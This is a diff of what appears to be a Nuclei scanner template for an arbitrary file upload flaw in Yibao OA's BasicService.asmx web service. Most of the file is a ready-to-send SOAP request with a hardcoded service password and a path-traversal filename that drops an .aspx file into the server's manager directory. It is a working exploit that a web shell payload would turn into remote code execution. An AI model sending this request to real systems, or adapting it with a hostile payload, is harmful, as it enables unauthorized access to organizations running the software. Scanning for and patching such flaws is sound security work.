@@ -3,14 +3,8 @@ info:
   name: 易宝OA-BasicService.asmx存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/psvz2clct4rnyrpa
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: psvz2clct4rnyrpa
-    fofa: title="欢迎登录易宝OA系统"
 http:
 - raw:
   - "POST /WebService/BasicService.asmx HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:123.0) Gecko/20100101 Firefox/123.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nSOAPAction: [http://tempuri.org/UploadBillFile](http://tempuri.org/UploadBillFile)\nContent-Type: text/xml;charset=UTF-8\nContent-Length: 521\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:tem=\"http://tempuri.org/\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <tem:UploadBillFile>\n         <!--type: base64Binary-->\n         <tem:fs>aGVsbG8K</tem:fs>\n         <!--type: string-->\n         <tem:FileName>../../manager/hello.aspx</tem:FileName>\n         <!--type: string-->\n         <tem:webservicePassword>{ac80457b-368d-4062-b2dd-ae4d490e1c4b}</tem:webservicePassword>\n      </tem:UploadBillFile>\n   </soapenv:Body>\n</soapenv:Envelope>"
